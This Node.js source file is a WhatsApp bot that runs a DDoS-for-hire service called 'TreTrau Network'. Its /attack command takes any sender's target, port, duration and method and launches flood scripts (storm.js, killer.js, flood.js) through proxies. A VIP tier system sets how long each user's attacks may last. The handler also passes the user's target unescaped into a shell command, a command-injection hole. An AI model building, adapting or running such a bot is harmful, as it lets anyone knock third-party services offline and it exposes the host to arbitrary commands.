const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const qrcode = require("qrcode-terminal");
const fs = require("fs");
const { exec } = require("child_process");
const adminname = "phuvanduc";
const channel = "TreTrau Network Service";
const proxyfile = "proxy.txt";
const ratecustom = "5";
const threadcustom = "5";
const defaultMaxTime = 60;
const vipFile = "./vip.json";
let vipData = { admin: [], vip_users: {} };

if (fs.existsSync(vipFile)) {
    try {
        vipData = JSON.parse(fs.readFileSync(vipFile));
    } catch (error) {
        console.error("⚠️ Error reading vip.json:", error);
    }
}

function getMaxTime(phone) {
    return vipData.vip_users[phone]?.max_time || defaultMaxTime;
}

function isAdmin(phone) {
    return vipData.admin.includes(phone);
}

async function tretrauwhatsapp() {
    const { state, saveCreds } = await useMultiFileAuthState("auth_info_baileys");
    const sock = makeWASocket({ auth: state, printQRInTerminal: true });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", ({ connection, lastDisconnect, qr }) => {
        if (qr) {
            console.log("⚡ Scan QR To Connect");
            qrcode.generate(qr, { small: true });
        }

        if (connection === "close") {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== 401;
            console.log("🔴 Lost Connection, Reconnecting...", shouldReconnect);
            if (shouldReconnect) tretrauwhatsapp();
        } else if (connection === "open") {
            console.log("🟢 Bot Successfully Connected\n🍀 TreTrau Network, Best Whatsapp DDoS Bot\n🍁 Script Creator : https://t.me/phuvanduc\n💮 Link Service : https://t.me/tretraunetwork");
        }
    });

    sock.ev.on("messages.upsert", async ({ messages }) => {
        const msg = messages[0];
        if (!msg?.message) return;

        const sender = msg.key.remoteJid;
        const text = msg.message.conversation || 
                     msg.message.extendedTextMessage?.text || 
                     msg.message.imageMessage?.caption || 
                     msg.message.videoMessage?.caption || 
                     msg.message.documentMessage?.caption || "";

        if (typeof text !== "string" || !text.trim()) return;
        
        let userName = msg.pushName || "User";
        let phone = sender.split("@")[0];
        let maxTime = getMaxTime(phone);

        console.log(`💬 Message: ${userName} (${phone}): ${text}`);

        if (text.startsWith("/ping")) {
            await sock.sendMessage(sender, { text: "🏓 Pongg" });
            return;
        }

        if (text.startsWith("/start")) {
            await sock.sendMessage(sender, { text: `👋 Hello, ${userName}!, Have You Joined https://t.me/tretraunetwork Yet? If You Haven't Joined, Join To Get The Latest Versions Of Whatsapp Bot, DDoS Panel....` });
            return;
        }

        if (text.startsWith("/method")) {
            const videoPath = "./video/method.mp4";
            if (fs.existsSync(videoPath)) {
                await sock.sendMessage(sender, {
                    video: fs.readFileSync(videoPath),
                    caption: `🍁 *Available Methods* 🍁\n💮 /storm - High-Power Attack\n💮 /killer - Killer Attack Method \n💮 /flood - Flood Method Attack`
                });
            }
            return;
        }

        if (text.startsWith("/bl")) {
            await sock.sendMessage(sender, { text: "Blacklist: *No*" });
            return;
        }

        if (text.startsWith("/plan")) {
            const videoPath = "./video/plan.mp4";
            if (fs.existsSync(videoPath)) {
                await sock.sendMessage(sender, {
                    video: fs.readFileSync(videoPath),
                    caption: `🍀 Account Information 🍀\n🔹 Username: ${userName}\n🔹 Max Attack Time: ${maxTime}s \n🔹 VIP: ${maxTime > defaultMaxTime ? "True" : "False"}\n🔹 Founder: ${adminname}\n🔹 Service: ${channel}`
                });
            }
            return;
        }

        if (text.startsWith("/attack")) {
            const args = text.split(" ").slice(1);
            if (args.length < 4) {
                await sock.sendMessage(sender, { text: "📌 Example: /attack target port time method" });
                return;
            }

            const [url, port, time, mth] = args;
            if (parseInt(time) > maxTime) {
                await sock.sendMessage(sender, { text: `⚠️ Your max attack time is ${maxTime} seconds` });
                return;
            }

            const allowedMethods = ["storm", "killer", "flood"];
            if (!allowedMethods.includes(mth)) {
                await sock.sendMessage(sender, { text: "⚠️ Invalid attack method!" });
                return;
            }
            const videoPath = "./video/attack.mp4";
            if (fs.existsSync(videoPath)) {
                await sock.sendMessage(sender, {
                    video: fs.readFileSync(videoPath),
                    caption: `❄️ Attack *Successfully* Sent To Server ❄️\n` +
                             `*UserName* : ${userName}\n` +
                             `*Target* : ${url}\n` +
                             `*Port* : ${port}\n` +
                             `*Duration* : ${time}\n` +
                             `*Method* : ${mth}\n` +
                             `*Vip* : ${maxTime > defaultMaxTime ? "True" : "False"}\n` +
                             `📌 Notes : *${channel}*`
                });
            } else {
                await sock.sendMessage(sender, { text: "⚠️ Video Not Found" });
            }
            let command;
            if (mth === "flood") {
                command = `node flood.js ${url} ${time} ${ratecustom} ${threadcustom} ${proxyfile}`;
            } else {
                command = `node ${mth}.js ${url} ${time} ${ratecustom} ${threadcustom} ${proxyfile}`;
            }

            console.log(`🚀 Executing: ${command}`);
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`⚠️ Error executing attack: ${error.message}`);
                    console.error(`⚠️ Stderr: ${stderr}`);
                    return;
                }
                console.log(`✅ Attack executed successfully: ${stdout}`);
                if (stderr) console.warn(`⚠️ Stderr (non-fatal): ${stderr}`);
            });
            return;
        }

        if (text.startsWith("/setvip")) {
            if (!isAdmin(phone)) {
                await sock.sendMessage(sender, { text: "⚠️ You do not have permission to use this command" });
                return;
            }

            const args = text.split(" ").slice(1);
            if (args.length < 3) {
                await sock.sendMessage(sender, { text: "📌 Example: /setvip phone_number max_time expiry_days" });
                return;
            }

            const [vipPhone, maxTime, expiry] = args;
            vipData.vip_users[vipPhone] = { max_time: parseInt(maxTime), expiry };
            fs.writeFileSync(vipFile, JSON.stringify(vipData, null, 4));

            await sock.sendMessage(sender, { text: `✅ VIP set: ${vipPhone}, Max Time: ${maxTime}s, Expiry: ${expiry} days` });
            return;
        }

        if (text.startsWith("/rmvip") || text.startsWith("/removevip")) {
            if (!isAdmin(phone)) {
                await sock.sendMessage(sender, { text: "⚠️ You do not have permission to use this command" });
                return;
            }

            const args = text.split(" ").slice(1);
            if (args.length < 1) {
                await sock.sendMessage(sender, { text: "📌 Example: /rmvip phone_number" });
                return;
            }

            const [vipPhone] = args;
            if (!vipData.vip_users[vipPhone]) {
                await sock.sendMessage(sender, { text: `⚠️ ${vipPhone} is not a VIP user!` });
                return;
            }

            delete vipData.vip_users[vipPhone];
            fs.writeFileSync(vipFile, JSON.stringify(vipData, null, 4));

            await sock.sendMessage(sender, { text: `✅ VIP removed: ${vipPhone}` });
            return;
        }

        if (text.startsWith("/help")) {
            const videoPath = "./video/help.mp4";
            if (fs.existsSync(videoPath)) {
                await sock.sendMessage(sender, {
                    video: fs.readFileSync(videoPath),
                    caption: `🛠 *Commands List* 🛠\n` +
                             `/start - Start The Bot\n` +
                             `/attack - Start A DDoS Attack\n` +
                             `/help - To See All Commands\n`+
                             `/method - To See All TreTrauDDoS - Method\n` +
                             `/bl - To See BlackList\n` +
                             `/plan - To See Account Plan\n`+
                             `/ping - To Ping Bot Dead Or Live\n` +
                             `/setvip - Add Vip User\n`+
                             `/rmvip - Remove Vip User\n`+
                             `📌 *Notes:* Don't Spam Attacks`
                });
            } else {
                await sock.sendMessage(sender, { text: "⚠️ Help video not found!" });
            }
            return;
        }
    });

    return sock;
}

tretrauwhatsapp();